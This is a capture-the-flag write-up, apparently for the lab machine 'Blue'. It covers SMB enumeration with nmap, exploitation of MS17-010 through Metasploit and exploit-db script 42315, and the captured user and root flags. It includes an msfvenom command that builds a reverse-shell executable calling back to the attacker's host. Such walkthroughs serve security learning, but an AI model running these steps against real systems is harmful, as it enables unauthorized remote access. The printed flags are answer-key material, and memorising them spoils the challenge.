# Blue
> Write-up author: jon-brandy
## DESCRIPTION:
- NONE
## HINT:
- NONE
## STEPS:
1. First, let's scan the host given using nmap.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/210548655-c761e148-c1bf-4b32-a17e-8c1a72c690fb.png)


![image](https://user-images.githubusercontent.com/70703371/210548679-5dd82615-0a4e-44e9-a4bf-2cd51961c46b.png)


2. Based from the output, we know that port 445 shall be our interests, because it seems running some types of network shares. Remember that 139 & 445 is SMB port, so let's check nmap scripts about `smb-vuln`. Now only what now we know that we're working with `windows 7`.
3. Simply run this command:

```
ls /usr/share/nmap/scripts | grep smb-vuln
```

> RESULT

![image](https://user-images.githubusercontent.com/70703371/210548775-11ed93fa-0149-40a9-920a-1257c94d9989.png)


4. Now let's use all of them for port 139 & 445.

```
nmap --script smb-vuln* -p 139,445 10.10.10.40
```

> RESULT

![image](https://user-images.githubusercontent.com/70703371/210548814-20b88593-4861-4a8e-a675-e21edf35b868.png)


5. As we can see the vuln here is we can do RCE, also we got the link references:

![image](https://user-images.githubusercontent.com/70703371/210548936-bad60e4f-f1df-4909-83f4-d59a102c7e0e.png)


6. Anyway, i will try to use the **metasploit** first, then i'll try to solve it without metasploit.

### WITH METASPLOIT

1. First, open **msfconsole**, then input this command -> `search ms17-010`

> RESULT

![image](https://user-images.githubusercontent.com/70703371/210549303-6f6bd9b9-3f1f-410c-b3af-6df4c444cee0.png)


2. The modules we want to use must be `0` , `2`, and `3`. But let's try with `0` and `2` first.

```
Reason:
The 1st module -> Is intended for windows 8, which is not the system.
The 3rd module -> Is auxiliary, though it says command execution, let's put is last. 
The 4th module -> Is a scanner.
The 5th module -> Is using a backdoor (must be on the system already).
```

3. Let's type `use 0`.

> RESULT - set the RHOSTS and lhost

![image](https://user-images.githubusercontent.com/70703371/210550559-ac898d76-deac-4ca8-8222-543969989a1d.png)

4. Type `exploit`.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/210550767-4e327376-f153-4d65-bfdf-3e1ffbb8dbcb.png)


![image](https://user-images.githubusercontent.com/70703371/210550828-15d51f7d-6a90-4a73-96f7-c55d5ab6a9d5.png)


5. Great! Turns out we're already the root.
6. Let's set the mode to stable shell.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/210550911-30353853-3911-433f-91c0-2970f22412fb.png)


7. When i tried to list all the directories, we got many directories. But our interest here is to jump to the `Users` or `users` directory.
8. Let's try one of them.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/210551510-4fe09bf9-069e-4536-b46f-1988c57e440a.png)


9. Got it, now let's lists it.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/210551605-019e6678-2cef-4fb8-a707-34de82dfb9fc.png)


10. Let's jump to `harris` -> `Desktop`.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/210551720-de8cc37e-ad94-460d-9dd5-86acebb56073.png)


![image](https://user-images.githubusercontent.com/70703371/210551749-b6f42d66-1e49-4390-b906-5e30048ebe5c.png)


11. Got the user flag!

## USER FLAG (WITH METASPLOIT)

```
32e24b1a214c952a07446d5317505f5a
```

12. Now to get the root, let's jump to the `Administrator` directory, then go to `Desktop`.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/210551976-4e651bfd-1885-4582-b0ed-53acb1b7fad5.png)


![image](https://user-images.githubusercontent.com/70703371/210552024-5810ae0c-fcf4-4075-af40-2de49d59ad91.png)


13. Got the root flag!

## ROOT FLAG (WITH METASPLOIT)

```
0f6cf23df2d2c550f6c7f42eab29077c
```


### WITHOUT METASPLOIT APPROACH (UNFINISHED)

1. Now without the metasploit, let's see if there's any python script we can use in the `exploitdb`.

```
searchsploit ms17-010
```

> RESULT

![image](https://user-images.githubusercontent.com/70703371/210553394-148e224b-539a-4d3b-ba17-c575aea9bfbb.png)


2. Since we're working with windows 7, let's download this one:

![image](https://user-images.githubusercontent.com/70703371/210553802-74515538-e44c-40e6-bd79-0f0d65091f96.png)


```
searchsploit -m 42315
```


![image](https://user-images.githubusercontent.com/70703371/210554128-f7c81f1a-c0b9-4039-8ffa-01978ed64d5e.png)


3. Anyway let's try to run the script to see if there are any python requirement we need to install first.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/210554324-943b11a3-a895-43ed-90bb-7994c09a1183.png)


> SOLUTION - THE LINK IS COMMENTED INSIDE THE SCRIPT

![image](https://user-images.githubusercontent.com/70703371/210554824-fa5a49a4-151d-46ae-95f1-a1257efec6f5.png)


4. Since the repository is no longer available, i used this one:

```
https://github.com/worawit/MS17-010/blob/master/mysmb.py
```

5. Hence we got 2 scripts now.

![image](https://user-images.githubusercontent.com/70703371/210555874-7f47e553-e85c-4ff0-9698-332d4e5bef0e.png)


6. Next, we need to use **msfvenom** to generate a simple executeable which has reverse shell payload.

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.17 LPORT=443 -f exe > reverseShell.exe
```

> RESULT


![image](https://user-images.githubusercontent.com/70703371/210556365-cb542630-1c0b-4676-acee-0c03d90141d9.png)


7. Now we need to change the exploit to add credentials, since we don't have any creds, let's check with `enum4linux` whether the machine allows us to enter guest username.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/210557036-2218b368-de11-4687-b0d7-44b598d5088c.png)


8. Great we're allowed then.
9. Now let's do few changes for 42315.py

![image](https://user-images.githubusercontent.com/70703371/210558184-96b90145-7683-4579-aac2-1fe0ac845d17.png)





